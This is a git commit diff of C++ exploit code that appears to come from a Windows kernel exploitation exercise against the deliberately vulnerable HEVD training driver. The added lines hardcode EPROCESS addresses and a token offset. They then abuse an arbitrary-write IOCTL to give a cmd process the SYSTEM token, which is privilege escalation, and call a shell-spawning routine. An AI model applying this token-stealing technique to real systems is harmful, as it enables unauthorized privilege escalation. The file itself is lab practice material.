6b5a1091410ceb517026436a99e6f845e28944e6
0xnitz <nitzan.adut@gmail.com>
2026-01-25 11:27:44 +0200

    Added offsets of my machine. Working arbitrary write

--- ArbitraryWrite/ArbitraryWrite.cpp
+++ ArbitraryWrite/ArbitraryWrite.cpp
@@ -14,12 +14,14 @@ void exploit()
 	ByteVector in_buffer;
 	in_buffer.resize(sizeof(WriteWhatWhere) + sizeof(wchar_t));
 	std::memset(in_buffer.data(), 0, sizeof(in_buffer));
-	WriteWhatWhere www = { .What = 0xdeadbeef, .Where = 0xdeadbeef }; // Change token to system
+	// ffffbe8c004b1080 cmd eprocess (+0x248 for token)
+	// ffffbe8bf96ac040 system eprocess (+0x248 for token)
+	WriteWhatWhere www = { .What = 0xffffbe8bf96ac040 + 0x248, .Where = 0xffffbe8c004b1080 + 0x248 }; // Change token of owning cmd to system
 	std::memcpy(in_buffer.data(), &www, sizeof(WriteWhatWhere));
 
 	std::ignore = hevd.call_ioctl(ARBITRARY_WRITE_IOCTL, in_buffer, sizeof(Address64));
 
-	PostExploitation::pop_shell();
+	PostExploitation::pop_shell(); // useless here because im chaning the token of the owning cmd, but just for the wow factor :)
 }
 
 }
